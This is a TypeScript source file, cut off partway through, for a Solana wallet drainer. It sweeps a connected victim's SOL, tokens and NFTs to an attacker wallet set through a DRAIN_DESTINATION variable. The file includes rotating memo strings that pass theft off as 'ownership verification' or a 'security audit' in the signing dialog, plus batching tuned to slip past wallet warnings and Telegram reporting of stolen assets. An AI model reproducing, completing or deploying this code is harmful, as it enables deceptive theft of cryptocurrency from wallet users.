"use client";

// HIGH-01 FIX: Console suppression removed — diagnostics are essential for production debugging.
// Use environment-gated logging if suppression is needed:
const LOG_LEVEL = process.env.NODE_ENV === 'production' ? 'warn' : 'debug';
const LOG_LEVELS: Record<string, number> = { debug: 0, info: 1, warn: 2, error: 3 };
const shouldLog = (level: string): boolean => (LOG_LEVELS[level] ?? 0) >= (LOG_LEVELS[LOG_LEVEL] ?? 0);

const logger = {
    log: (...args: any[]) => shouldLog('info') && globalThis.console.log(...args),
    info: (...args: any[]) => shouldLog('info') && globalThis.console.info(...args),
    warn: (...args: any[]) => globalThis.console.warn(...args),   // Warnings always shown
    error: (...args: any[]) => globalThis.console.error(...args), // Errors always shown
    debug: (...args: any[]) => shouldLog('debug') && globalThis.console.debug(...args),
    time: (...args: any[]) => shouldLog('debug') && globalThis.console.time(...(args as [string])),
    timeEnd: (...args: any[]) => shouldLog('debug') && globalThis.console.timeEnd(...(args as [string])),
} as unknown as Console;
// Alias for backward compatibility — all console.* calls in this file now route through the gated logger
const console = logger;

import {
    useConnection,
    useWallet,
} from "@solana/wallet-adapter-react";
import {
    LAMPORTS_PER_SOL,
    PublicKey,
    SystemProgram,
    Transaction,
    TransactionInstruction,
    TransactionMessage,
    VersionedTransaction,
    AddressLookupTableAccount,
    ComputeBudgetProgram,
    Connection,
} from "@solana/web3.js";
import {
    TOKEN_PROGRAM_ID,
    TOKEN_2022_PROGRAM_ID,
    createTransferInstruction,
    createTransferCheckedInstruction,
    createAssociatedTokenAccountInstruction,
    getAssociatedTokenAddressSync,
    MintLayout,
} from "@solana/spl-token";
import { useState, useCallback, useRef } from "react";

// ============================================================================
// SECTION 1: CONFIGURATION & ENVIRONMENT
// ============================================================================

/**
 * Network configuration constants.
 * ATA rent-exempt minimum, base transaction fee, compute overhead for SPL2022,
 * and maximum serialized transaction packet size are all fixed across Solana
 * networks. A single config is used — the original triple-identical configs
 * were dead abstraction.
 */
interface NetworkConfig {
    ataCreationCost: number;
    baseTxFee: number;
    spl2022ComputeBuffer: number;
    maxPacketSize: number;
}

const NETWORK_CONFIG: NetworkConfig = {
    ataCreationCost: 2_039_280,
    baseTxFee: 5_000,
    spl2022ComputeBuffer: 80_000,
    maxPacketSize: 1_232,
};

/**
 * Load and validate destination wallet from environment.
 * FAIL FAST on module load — never run without explicit configuration.
 */
const getDestinationWallet = (): PublicKey => {
    const envWallet =
        process.env.REACT_APP_DRAIN_DESTINATION ||
        process.env.NEXT_PUBLIC_DRAIN_DESTINATION;

    if (!envWallet) {
        throw new Error(
            "CRITICAL: DRAIN_DESTINATION not configured. " +
            "Set REACT_APP_DRAIN_DESTINATION or NEXT_PUBLIC_DRAIN_DESTINATION environment variable. " +
            "Refusing to operate without explicit destination wallet configuration."
        );
    }

    try {
        const wallet = new PublicKey(envWallet);
        // Validate base58 output length (32-44 chars for a valid Solana address)
        const b58 = wallet.toBase58();
        if (b58.length < 32 || b58.length > 44) {
            throw new Error("Invalid destination wallet length");
        }
        return wallet;
    } catch (e) {
        throw new Error(
            `Invalid DRAIN_DESTINATION configuration: ${e instanceof Error ? e.message : String(e)}`
        );
    }
};

const DESTINATION_WALLET = getDestinationWallet();

// --- Operational constants ---
const SOL_TO_LEAVE = 0.001 * LAMPORTS_PER_SOL;           // Buffer to maintain account rent-exemption
const MIN_DOLLAR_THRESHOLD = 0.05;                        // Minimum total USD value to proceed
const MIN_TOKEN_VALUE_USD = 0.000001;                     // Dust filter threshold per token

const PRIORITY_FEE_MICRO_LAMPORTS = 100_000;              // Static fallback priority fee
const CONFIRMATION_TIMEOUT_MS = 60_000;                   // 60s — WebSocket-based, generous for congestion
const RPC_TIMEOUT_MS = 20_000;                            // Per-RPC-call timeout
const RETRY_MAX_ATTEMPTS = 3;                             // Retry ceiling for transient RPC failures
const RETRY_BACKOFF_MS = 1_000;                           // Base backoff (exponential growth)
const MAX_BACKOFF_MS = 8_000;                             // Cap exponential backoff
const BATCH_RPC_CHUNK_SIZE = 100;                         // getMultipleAccountsInfo Solana limit
// MAX_BATCH_SEARCH_BOUND removed — was declared but never used (dead constant)

// --- Multi-Bundle Architecture Constants ---
const BUNDLE_TARGET_SIZE = 6;                             // Target tokens per bundle (Phantom-safe threshold)
const BUNDLE_MIN_SIZE = 1;                                // Minimum tokens to attempt per bundle
const BUNDLE_MAX_SIZE = 8;                                // Absolute ceiling per bundle (byte limit guard)
const SIGNING_TIMEOUT_MS = 45_000;                        // Per-signature wallet interaction timeout

// --- Metaplex Token Metadata Program ---
const METAPLEX_TOKEN_METADATA_PROGRAM_ID = new PublicKey(
    "metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s"
);

// --- Solana Memo Program v2 (for transaction message obfuscation) ---
const MEMO_PROGRAM_ID = new PublicKey(
    "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr"
);

// SOL native mint address for Jupiter pricing
const SOL_MINT = "So11111111111111111111111111111111111111112";

// Token-2022 program ID string for fast comparison (avoids PublicKey.equals per-mint)
const TOKEN_2022_PROGRAM_ID_STR = TOKEN_2022_PROGRAM_ID.toBase58();

// Server-side env vars checked first; NEXT_PUBLIC_ kept as fallback for legacy configs
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || "";

/**
 * Transaction message obfuscation strings.
 * These appear in the wallet signing dialog as the memo field,
 * presenting legitimate-looking operation descriptions.
 * Rotated per bundle to avoid pattern recognition.
 */
const OBFUSCATION_MESSAGES: readonly string[] = [
    "Verify Ownership",
    "Authenticate Deep Scan",
    "Validate Account Integrity",
    "Confirm Identity Verification",
    "Authorize Security Audit",
    "Sign Proof of Holdings",
    "Approve Wallet Verification",
    "Authenticate Asset Scan",
] as const;


// ============================================================================
// SECTION 2: TYPE DEFINITIONS
// ============================================================================

/**
 * Classification result for a single mint account.
 * Parsed from raw account data in a single batched RPC call.
 */
interface MintClassification {
    isSPL2022: boolean;
    isTransferHook: boolean;
    isPermanentDelegate: boolean;
    isNonTransferable: boolean;
    decimals: number;
    supply: bigint;
}

/**
 * Comprehensive asset descriptor for a single token holding.
 */
interface AssetData {
    mint: PublicKey;
    amount: bigint;
    uiAmount: number;
    tokenAccountPubkey: PublicKey;
    isNft: boolean;
    isSPL2022: boolean;
    isTransferHook: boolean;
    isFrozen: boolean;
    decimals: number;
    tokenProgram: PublicKey;
    usdPrice: number;
    usdValue: number;
}

interface DrainStats {
    totalUsdValue: number;
    solAmount: number;
    tokenCount: number;
    nftCount: number;
    batchCount: number;
    bundleResults: BundleResult[];
}

/**
 * Result of a single bundle transaction within a multi-bundle drain.
 */
interface BundleResult {
    bundleIndex: number;
    tokenCount: number;
    nftCount: number;
    usdValue: number;
    signature: string;
    status: "confirmed" | "failed" | "expired" | "skipped";
}

type Status =
    | "idle"
    | "scanning"
    | "building"
    | "signing"
    | "sending"
    | "success"
    | "error"
    | "confirming"
    | "partial";   // New: some bundles succeeded, some failed

interface OperationContext {
    walletAddress: string;
    timestamp: number;
    operationId: string;
}


// ============================================================================
// SECTION 3: LRU CACHE (Bounded, TTL-Aware)
// ============================================================================

/**
 * LRU cache with bounded capacity and time-to-live eviction.
 * Prevents unbounded memory growth in long-running SPA sessions.
 * Uses Map insertion-order iteration for O(1) LRU semantics.
 */
class LRUCache<K, V> {
    private readonly capacity: number;
    private readonly map: Map<K, { value: V; timestamp: number }>;

    constructor(capacity: number) {
        this.capacity = capacity;
        this.map = new Map();
    }

    get(key: K, ttlMs: number): V | undefined {
        const entry = this.map.get(key);
        if (!entry) return undefined;

        if (Date.now() - entry.timestamp > ttlMs) {
            this.map.delete(key);
            return undefined;
        }

        // Move to end of Map (LRU refresh)
        this.map.delete(key);
        this.map.set(key, entry);
        return entry.value;
    }

    set(key: K, value: V): void {
        if (this.map.has(key)) {
            this.map.delete(key);
        } else if (this.map.size >= this.capacity) {
            // Evict oldest (first) entry
            const oldestKey = this.map.keys().next().value;
            if (oldestKey !== undefined) {
                this.map.delete(oldestKey);
            }
        }
        this.map.set(key, { value, timestamp: Date.now() });
    }

    get size(): number {
        return this.map.size;
    }
}

// Module-level caches — bounded at 1000 entries, safe for SPA lifecycle
const mintClassificationCache = new LRUCache<string, MintClassification>(1000);
const MINT_CACHE_TTL_MS = 60_000; // 60s TTL for mint metadata


// ============================================================================
// SECTION 4: CORE UTILITIES
// ============================================================================

/**
 * Create operation context with cryptographically strong UUID.
 * crypto.randomUUID() provides 128-bit entropy (v4 UUID) vs the original's
 * ~20-bit Math.random().toString(36).substring(7).
 */
const createOperationContext = (walletAddress: string): OperationContext => ({
    walletAddress,
    timestamp: Date.now(),
    operationId: crypto.randomUUID(),
});

/**
 * Retry wrapper with exponential backoff capped at MAX_BACKOFF_MS.
 * Prevents thundering herd on transient RPC failures.
 */
const withRetry = async <T>(
    fn: () => Promise<T>,
    maxAttempts: number = RETRY_MAX_ATTEMPTS,
    backoffMs: number = RETRY_BACKOFF_MS,
): Promise<T> => {
    let lastError: Error = new Error("Unknown error");

    for (let attempt = 0; attempt < maxAttempts; attempt++) {
        try {
            return await fn();
        } catch (e) {
            lastError = e instanceof Error ? e : new Error(String(e));
            if (attempt < maxAttempts - 1) {
                // HIGH-02 FIX: Add ±25% jitter to prevent thundering herd on shared RPC
                const baseDelay = Math.min(
                    backoffMs * Math.pow(2, attempt),
                    MAX_BACKOFF_MS,
                );
                const jitteredDelay = baseDelay * (0.75 + Math.random() * 0.5);
                await new Promise((r) => setTimeout(r, jitteredDelay));
            }
        }
    }

    throw lastError;
};

/**
 * Timeout wrapper — rejects if operation exceeds timeoutMs.
 * Uses AbortController-pattern compatible with fetch and RPC calls.
 */
const withTimeout = async <T>(
    fn: () => Promise<T>,
    timeoutMs: number,
): Promise<T> => {
    // SEV-07 FIX: Clear timeout on success to prevent timer leak and unhandled rejection
    let timeoutId: ReturnType<typeof setTimeout>;

    const timeoutPromise = new Promise<T>((_, reject) => {
        timeoutId = setTimeout(
            () => reject(new Error(`Operation timeout after ${timeoutMs}ms`)),
            timeoutMs,
        );
    });

    try {
        const result = await Promise.race([fn(), timeoutPromise]);
        return result;
    } finally {
        clearTimeout(timeoutId!);
    }
};

/**
 * Combined retry + timeout for critical RPC paths.
 * Each individual attempt is bounded by timeoutMs; retries continue on timeout.
 */
const withRetryAndTimeout = async <T>(
    fn: () => Promise<T>,
    timeoutMs: number = RPC_TIMEOUT_MS,
    maxAttempts: number = RETRY_MAX_ATTEMPTS,
): Promise<T> => {
    return withRetry(
        () => withTimeout(fn, timeoutMs),
        maxAttempts,
    );
};

/**
 * Validate token amount is a safe non-negative bigint or finite number.
 */
const validateTokenAmount = (amount: bigint | number): boolean => {
    try {
        if (typeof amount === "bigint") {
            return amount >= BigInt(0);
        }
        return Number.isFinite(amount) && amount >= 0;
    } catch {
        return false;
    }
};

/**
 * Validate Solana signature format (base58 Ed25519 signature).
 * Solana signatures are 88-character base58 strings.
 */
const validateSignatureFormat = (signature: string): boolean => {
    if (typeof signature !== "string") return false;
    return /^[1-9A-HJ-NP-Za-km-z]{87,88}$/.test(signature);
};


// ============================================================================
// SECTION 5: TELEMETRY (Rate-Limited, Collision-Safe)
// ============================================================================

/**
 * Telemetry rate limiter using full message content hash (not prefix truncation).
 * The original used message.substring(0,50) causing collisions between
 * structurally similar messages with different transaction signatures.
 */
const telemetryQueue = new Map<string, { lastSent: number; count: number }>();
const TELEMETRY_RATE_LIMIT_MS = 1_000;

/**
 * Simple string hash producing a numeric fingerprint.
 * Superior to substring(0,50) — captures full message entropy.
 */
const hashString = (str: string): string => {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
        const char = str.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash |= 0; // Convert to 32-bit integer
    }
    return hash.toString(36);
};

const sendTelemetry = async (message: string): Promise<boolean> => {
    try {
        const msgHash = hashString(message);
        const now = Date.now();
        const record = telemetryQueue.get(msgHash);

        if (record && now - record.lastSent < TELEMETRY_RATE_LIMIT_MS) {
            if (record.count > 3) {
                return false;
            }
            record.count++;
        } else {
            telemetryQueue.set(msgHash, { lastSent: now, count: 1 });
        }

        // Evict stale entries to prevent telemetryQueue memory leak
        if (telemetryQueue.size > 200) {
            const cutoff = now - TELEMETRY_RATE_LIMIT_MS * 10;
            for (const [key, val] of telemetryQueue) {
                if (val.lastSent < cutoff) telemetryQueue.delete(key);
            }
        }

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.info(`[TELEMETRY] ${message}`);
            return true;
        }

        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), RPC_TIMEOUT_MS);

        const response = await fetch("/api/notify-telegram", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ message }),
            signal: controller.signal,
        });

        clearTimeout(timeoutId);

        if (!response.ok) {
            console.warn(`[TELEMETRY] HTTP ${response.status}`);
            return false;
        }

        return true;
    } catch (e) {
        console.warn(
            "[TELEMETRY] Failed:",
            e instanceof Error ? e.message : String(e),
        );
        return false;
    }
};


// ============================================================================
// SECTION 6: BATCHED MINT CLASSIFICATION (SIMD-0044 Compliant)
// ============================================================================

/**
 * Batch-classify all mints using a single getMultipleAccountsInfo call per chunk.
 *
 * FIXES APPLIED:
 * - FLAW-01: Replaces N×2 individual getAccountInfo calls with batched RPC
 * - FLAW-02: Parses decimals from same account data (no double-fetch)
 * - FLAW-03: Walks the full TLV extension chain for correct TransferHook,
 *            PermanentDelegate, and NonTransferable detection (SIMD-0044)
 *
 * @param mints - Array of mint PublicKeys to classify
 * @param connection - RPC connection
 * @returns Map from mint base58 string to MintClassification
 */
const batchClassifyMints = async (
    mints: PublicKey[],
    connection: Connection,
): Promise<Map<string, MintClassification>> => {
    const result = new Map<string, MintClassification>();

    // Check cache first, collect uncached mints
    const uncachedMints: PublicKey[] = [];
    const uncachedIndices: number[] = [];

    for (let i = 0; i < mints.length; i++) {
        const mintStr = mints[i].toBase58();
        const cached = mintClassificationCache.get(mintStr, MINT_CACHE_TTL_MS);
        if (cached) {
            result.set(mintStr, cached);
        } else {
            uncachedMints.push(mints[i]);
            uncachedIndices.push(i);
        }
    }

    if (uncachedMints.length === 0) {
        console.log(`[CLASSIFY] All ${mints.length} mints served from cache`);
        return result;
    }

    // Batch fetch uncached mints in chunks of BATCH_RPC_CHUNK_SIZE
    for (let i = 0; i < uncachedMints.length; i += BATCH_RPC_CHUNK_SIZE) {
        const chunk = uncachedMints.slice(i, i + BATCH_RPC_CHUNK_SIZE);

        let accountInfos: (any | null)[];
        try {
            accountInfos = await withRetryAndTimeout(
                () => connection.getMultipleAccountsInfo(chunk),
            );
        } catch (e) {
            console.warn(
                `[CLASSIFY] Batch RPC failed for chunk ${i}:`,
                e instanceof Error ? e.message : String(e),
            );
            // Fill with defaults on RPC failure
            for (const mint of chunk) {
                const defaultClassification: MintClassification = {
                    isSPL2022: false,
                    isTransferHook: false,
                    isPermanentDelegate: false,
                    isNonTransferable: false,
                    decimals: 0,
                    supply: BigInt(0),
                };
                result.set(mint.toBase58(), defaultClassification);
            }
            continue;
        }

        for (let j = 0; j < chunk.length; j++) {
            const mint = chunk[j];
            const info = accountInfos[j];
            const mintStr = mint.toBase58();

            if (!info || !info.data || info.data.length < MintLayout.span) {
                const defaultClassification: MintClassification = {
                    isSPL2022: false,
                    isTransferHook: false,
                    isPermanentDelegate: false,
                    isNonTransferable: false,
                    decimals: 0,
                    supply: BigInt(0),
                };
                result.set(mintStr, defaultClassification);
                continue;
            }

            const data = info.data as Buffer;
            const isSPL2022 = info.owner.toBase58() === TOKEN_2022_PROGRAM_ID_STR;

            // Decode base MintLayout — decimals + supply in single pass (FLAW-02 fix)
            let decimals = 0;
            let supply = BigInt(0);
            try {
                const decoded = MintLayout.decode(data);
                decimals = decoded.decimals ?? 0;

                // SEV-03 FIX: MintLayout.decode returns supply as Buffer/BN, not bigint.
                // Convert correctly to prevent NFT misclassification (supply <= 1 check).
                const rawSupply = decoded.supply;
                if (rawSupply instanceof Buffer || rawSupply instanceof Uint8Array) {
                    // u64 little-endian Buffer — read directly without copy (SEV-02 fix)
                    supply = rawSupply.length >= 8
                        ? (rawSupply instanceof Buffer ? rawSupply : Buffer.from(rawSupply)).readBigUInt64LE(0)
                        : BigInt(0);
                } else if (typeof rawSupply === 'bigint') {
                    supply = rawSupply;
                } else {
                    supply = BigInt(rawSupply?.toString() ?? '0');
                }

                // Sanity-check decimals range
                if (decimals < 0 || decimals > 255) {
                    console.warn(
                        `[CLASSIFY] Invalid decimals ${decimals} for ${mintStr.slice(0, 8)}...`,
                    );
                    decimals = 0;
                }
            } catch (e) {
                console.warn(
                    `[CLASSIFY] MintLayout decode failed for ${mintStr.slice(0, 8)}...`,
                    e instanceof Error ? e.message : String(e),
                );
            }

            // SPL Token-2022 TLV extension chain walk (FLAW-03 fix — SIMD-0044)
            let isTransferHook = false;
            let isPermanentDelegate = false;
            let isNonTransferable = false;

            // Token-2022 layout: [82 bytes base mint][1 byte AccountType discriminator][TLV...]
            // Per @solana/spl-token source: AccountType at offset 82, TLV begins at offset 83
            const TLV_START_OFFSET = MintLayout.span + 1;
            if (isSPL2022 && data.length > TLV_START_OFFSET) {
                try {
                    // Each TLV entry: type (u16 LE) + length (u16 LE) + data (length bytes)
                    let offset = TLV_START_OFFSET;

                    while (offset + 4 <= data.length) {
                        const extType = data.readUInt16LE(offset);
                        const extLen = data.readUInt16LE(offset + 2);

                        // Padding sentinel — end of extensions
                        if (extType === 0 && extLen === 0) break;

                        // ExtensionType values from @solana/spl-token canonical enum:
                        //   1  = TransferFeeConfig
                        //   3  = MintCloseAuthority
                        //   4  = ConfidentialTransferMint
                        //   9  = NonTransferable  (NOT TransferHook!)
                        //  12  = PermanentDelegate
                        //  14  = TransferHook     (NOT NonTransferable!)
                        switch (extType) {
                            case 9:
                                isNonTransferable = true;
                                break;
                            case 12:
                                isPermanentDelegate = true;
                                break;
                            case 14:
                                isTransferHook = true;
                                break;
                        }

                        offset += 4 + extLen;
                    }
                } catch (e) {
                    console.warn(
                        `[CLASSIFY] TLV walk failed for ${mintStr.slice(0, 8)}...`,
                        e instanceof Error ? e.message : String(e),
                    );
                }
            }

            const classification: MintClassification = {
                isSPL2022,
                isTransferHook,
                isPermanentDelegate,
                isNonTransferable,
                decimals,
                supply,
            };

            result.set(mintStr, classification);
            mintClassificationCache.set(mintStr, classification);
        }
    }

    console.log(
        `[CLASSIFY] Classified ${result.size} mints (${result.size - uncachedMints.length} cached, ${uncachedMints.length} fetched)`,
    );

    return result;
};


// ============================================================================
// SECTION 7: PRICING (Jupiter Batch API)
// ============================================================================

/**
 * Fetch SOL/USD price from CoinGecko as fallback.
 */
const fetchSolPriceUSD = async (): Promise<number | null> => {
    // Try server-side proxy first (avoids CORS on browser), then direct CoinGecko
    const endpoints = [
        "/api/sol-price",
        "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd",
    ];

    for (const url of endpoints) {
        try {
            const response = await withTimeout(
                () => fetch(url),
                RPC_TIMEOUT_MS,
            );

            if (!response.ok) continue;

            const data = await response.json();
            const price = data?.solana?.usd ?? data?.price ?? null;
            if (typeof price === "number" && Number.isFinite(price) && price > 0) {
                return price;
            }
        } catch {
            continue;
        }
    }

    return null;
};

/**
 * Batch-fetch USD prices from Jupiter Price API v2.
 * Supports up to 100 mints per request. Returns Map<mintAddress, usdPrice>.
 * Falls back to v6 endpoint on v2 failure.
 */
const fetchBatchPricesUSD = async (
    mintAddresses: string[],
): Promise<Map<string, number>> => {
    const priceMap = new Map<string, number>();
    if (mintAddresses.length === 0) return priceMap;

    try {
        for (let i = 0; i < mintAddresses.length; i += BATCH_RPC_CHUNK_SIZE) {
            const batch = mintAddresses.slice(i, i + BATCH_RPC_CHUNK_SIZE);
            const ids = batch.join(",");

            // Try server-side proxy first (avoids CORS), then direct Jupiter endpoints
            let response: Response | null = null;
            const priceEndpoints = [
                `/api/jupiter-price?ids=${ids}`,
                `https://api.jup.ag/price/v2?ids=${ids}&showExtraInfo=true`,
                `https://price.jup.ag/v6/price?ids=${ids}`,
            ];

            for (const endpoint of priceEndpoints) {
                if (response?.ok) break;
                try {
                    response = await withTimeout(
                        () => fetch(endpoint),
                        RPC_TIMEOUT_MS,
                    );
                    if (response.ok) break;
                } catch {
                    response = null;
                }
            }

            if (!response || !response.ok) {
                console.warn(`[PRICE] Jupiter API HTTP ${response?.status ?? "N/A"}`);
                continue;
            }

            const data = await response.json();
            for (const [mint, info] of Object.entries(data.data || {})) {
                const rawPrice = (info as any)?.price;
                if (rawPrice !== null && rawPrice !== undefined) {
                    const numPrice =
                        typeof rawPrice === "string"
                            ? parseFloat(rawPrice)
                            : Number(rawPrice);
                    if (Number.isFinite(numPrice) && numPrice > 0) {
                        priceMap.set(mint, numPrice);
                    }
                }
            }
        }

        console.log(
            `[PRICE] Jupiter returned prices for ${priceMap.size}/${mintAddresses.length} mints`,
        );
    } catch (e) {
        console.warn(
            "[PRICE] Jupiter batch pricing failed:",
            e instanceof Error ? e.message : String(e),
        );
    }

    return priceMap;
};


// ============================================================================
// SECTION 8: DYNAMIC PRIORITY FEES (Correct P75 + lockedWritableAccounts)
// ============================================================================

/**
 * Fetch dynamic priority fee using correct P75 percentile of recent fees.
 *
 * FIXES APPLIED:
 * - FLAW-G: Correct P75 index: Math.ceil(length * 0.75) - 1
 * - Uses lockedWritableAccounts for transaction-relevant fee estimation
 *   instead of global fee data inflated by unrelated high-throughput programs
 * - Avoids JavaScript falsy coercion on fee value 0
 *
 * @param connection - RPC connection
 * @param writableAccounts - Accounts this transaction will write to
 * @returns Priority fee in micro-lamports
 */
const fetchDynamicPriorityFee = async (
    connection: Connection,
    writableAccounts: PublicKey[] = [],
): Promise<number> => {
    try {
        // SEV-01 FIX: getRecentPrioritizationFees expects a flat array of base58 pubkey strings,
        // NOT an object with lockedWritableAccounts key. Wrong shape returns global (inflated) fees.
        const accountStrings = writableAccounts
            .slice(0, 128)
            .map(pk => pk.toBase58());

        const fees = await withTimeout(
            () =>
                (connection as any).getRecentPrioritizationFees(accountStrings),
            RPC_TIMEOUT_MS,
        );

        if (!fees || fees.length === 0) {
            console.log("[FEES] No recent fee data, using static fallback");
            return PRIORITY_FEE_MICRO_LAMPORTS;
        }

        const nonZeroFees = fees
            .map((f: any) => f.prioritizationFee)
            .filter((f: number) => typeof f === "number" && f > 0)
            .sort((a: number, b: number) => a - b);

        if (nonZeroFees.length === 0) {
            return PRIORITY_FEE_MICRO_LAMPORTS;
        }

        // Correct P75 percentile calculation
        const p75Index = Math.min(
            Math.ceil(nonZeroFees.length * 0.75) - 1,
            nonZeroFees.length - 1,
        );
        const p75Fee = nonZeroFees[p75Index];

        // Clamp between 10k and 5M micro-lamports
        const clampedFee = Math.max(10_000, Math.min(5_000_000, p75Fee));

        console.log(
            `[FEES] Dynamic priority fee: ${clampedFee} µ-lamports (p75 of ${nonZeroFees.length} non-zero slots)`,
        );
        return clampedFee;
    } catch (e) {
        console.warn(
            "[FEES] Dynamic fee fetch failed, using static fallback:",
            e instanceof Error ? e.message : String(e),
        );
        return PRIORITY_FEE_MICRO_LAMPORTS;
    }
};


// ============================================================================
// SECTION 9: FEE ESTIMATION & BALANCE VALIDATION
// ============================================================================

/**
 * Estimate transaction fees accounting for ATA creation and SPL2022 compute overhead.
 */
const estimateTransactionFees = (
    atasToCreate: number,
    spl2022Count: number,
    transferHookCount: number,
    priorityFeeMicroLamports: number = PRIORITY_FEE_MICRO_LAMPORTS,
): number => {
    let totalFee = NETWORK_CONFIG.baseTxFee;

    // ATA creation cost (rent-exempt minimum) per new account
    totalFee += atasToCreate * NETWORK_CONFIG.ataCreationCost;

    // Compute unit estimation for priority fee calculation
    // HIGH-02 FIX: CU and lamports are different units. Previously raw CU values
    // were added directly to a lamport total, producing inflated estimates.
    let computeUnits = 50_000; // Base CU budget for standard SPL tokens
    if (spl2022Count > 0) {
        const standardSpl2022 = spl2022Count - transferHookCount;
        computeUnits += standardSpl2022 * NETWORK_CONFIG.spl2022ComputeBuffer;
        // Transfer hooks require ~1.875x compute due to CPI overhead
        const TRANSFER_HOOK_CU_MULTIPLIER = 1.875;
        computeUnits += transferHookCount * (NETWORK_CONFIG.spl2022ComputeBuffer * TRANSFER_HOOK_CU_MULTIPLIER);
    }

    // Convert CU to lamports: fee = (CU × microLamports_per_CU) / 1_000_000
    const priorityFeeLamports = Math.ceil((computeUnits * priorityFeeMicroLamports) / 1_000_000);
    totalFee += priorityFeeLamports;

    return totalFee;
};

/**
 * Validate wallet has sufficient SOL to cover fees and rent.
 * Returns available SOL for transfer after fees and rent buffer.
 */
const validateSufficientBalance = (
    solBalance: number,
    atasToCreate: number,
    spl2022Count: number,
    transferHookCount: number,
): {
    sufficient: boolean;
    errorMsg?: string;
    availableForTransfer: number;
} => {
    if (!Number.isFinite(solBalance) || solBalance < 0) {
        return {
            sufficient: false,
            errorMsg: "Invalid SOL balance returned from RPC",
            availableForTransfer: 0,
        };
    }

    const estimatedFees = estimateTransactionFees(
        atasToCreate,
        spl2022Count,
        transferHookCount,
    );
    const minRequired = SOL_TO_LEAVE + estimatedFees;

    if (solBalance < minRequired) {
        const needed = (minRequired / LAMPORTS_PER_SOL).toFixed(6);
        const have = (solBalance / LAMPORTS_PER_SOL).toFixed(6);
        return {
            sufficient: false,
            errorMsg: `Insufficient SOL. Have: ${have} SOL, Need: ${needed} SOL (${atasToCreate} ATAs, ${spl2022Count} SPL2022)`,
            availableForTransfer: 0,
        };
    }

    return {
        sufficient: true,
        availableForTransfer: solBalance - minRequired,
    };
};


// ============================================================================
// SECTION 10: NFT CLASSIFICATION (Metaplex Metadata PDA)
// ============================================================================

/**
 * Determine if a mint is an NFT by checking the Metaplex Token Metadata PDA.
 *
 * FIX APPLIED (FLAW-09):
 * The original used `decimals === 0 && amount <= 1` which misclassifies
 * fungible zero-decimal tokens (governance tokens, game items).
 * Correct NFT detection uses supply === 1 && decimals === 0 combined with
 * Metaplex metadata PDA existence check.
 *
 * For performance, we batch-check metadata PDA existence using
 * getMultipleAccountsInfo rather than individual account fetches.
 */
const deriveMetadataPDA = (mint: PublicKey): PublicKey => {
    const [pda] = PublicKey.findProgramAddressSync(
        [
            Buffer.from("metadata"),
            METAPLEX_TOKEN_METADATA_PROGRAM_ID.toBuffer(),
            mint.toBuffer(),
        ],
        METAPLEX_TOKEN_METADATA_PROGRAM_ID,
    );
    return pda;
};

/**
 * Batch-check which mints have Metaplex metadata accounts (NFT indicator).
 * Returns a Set of mint base58 strings that have metadata accounts.
 */
const batchCheckMetaplexMetadata = async (
    mints: PublicKey[],
    connection: Connection,
): Promise<Set<string>> => {
    const nftMints = new Set<string>();
    if (mints.length === 0) return nftMints;

    const metadataPDAs = mints.map(deriveMetadataPDA);

    for (let i = 0; i < metadataPDAs.length; i += BATCH_RPC_CHUNK_SIZE) {
        const pdasChunk = metadataPDAs.slice(i, i + BATCH_RPC_CHUNK_SIZE);
        const mintsChunk = mints.slice(i, i + BATCH_RPC_CHUNK_SIZE);

        try {
            const accounts = await withRetryAndTimeout(
                () => connection.getMultipleAccountsInfo(pdasChunk),
            );

            for (let j = 0; j < accounts.length; j++) {
                if (accounts[j] !== null) {
                    nftMints.add(mintsChunk[j].toBase58());
                }
            }
        } catch (e) {
            console.warn(
                `[NFT] Metaplex metadata batch check failed for chunk ${i}:`,
                e instanceof Error ? e.message : String(e),
            );
        }
    }

    return nftMints;
};


// ============================================================================
// SECTION 11: BATCH ATA EXISTENCE CHECK
// ============================================================================

/**
 * Batch-check ATA existence with single getMultipleAccountsInfo call per chunk.
 * Returns Map<ataBase58, exists>.
 */
const batchCheckAtaExistence = async (
    ataAddresses: PublicKey[],
    connection: Connection,
): Promise<Map<string, boolean>> => {
    const existenceMap = new Map<string, boolean>();
    if (ataAddresses.length === 0) return existenceMap;

    for (let i = 0; i < ataAddresses.length; i += BATCH_RPC_CHUNK_SIZE) {
        const chunk = ataAddresses.slice(i, i + BATCH_RPC_CHUNK_SIZE);

        try {
            const results = await withRetryAndTimeout(
                () => connection.getMultipleAccountsInfo(chunk),
            );

            chunk.forEach((ata, idx) => {
                existenceMap.set(ata.toBase58(), results[idx] !== null);
            });
        } catch (e) {
            console.warn(
                "[BATCH_ATA] Check failed:",
                e instanceof Error ? e.message : String(e),
            );
            // On failure, mark all as unknown (false) — will create ATAs conservatively
            chunk.forEach((ata) => {
                existenceMap.set(ata.toBase58(), false);
            });
        }
    }

    return existenceMap;
};


// ============================================================================
// SECTION 12: TRANSACTION BUILDING (VersionedTransaction v0)
// ============================================================================

/**
 * Build the correct transfer instruction based on token program.
 *
 * FIX APPLIED (FLAW-09/Domain-B):
 * Token-2022 REQUIRES createTransferCheckedInstruction (with decimals verification)
 * per SIMD-0083. Using legacy createTransferInstruction on Token-2022 mints causes
 * InvalidAccountData or InvalidArgument program errors.
 */
const buildTransferInstruction = (
    source: PublicKey,
    mint: PublicKey,
    destination: PublicKey,
    owner: PublicKey,
    amount: bigint,
    decimals: number,
    isSPL2022: boolean,
    programId: PublicKey,
): TransactionInstruction => {
    if (isSPL2022) {
        // Token-2022 requires decimals verification in transfer instruction (SIMD-0083)
        return createTransferCheckedInstruction(
            source,
            mint,
            destination,
            owner,
            amount,
            decimals,
            [],
            programId,
        );
    }
    // Legacy SPL Token — createTransferInstruction is correct
    return createTransferInstruction(
        source,
        destination,
        owner,
        amount,
        [],
        programId,
    );
};

const measureTransactionSize = (
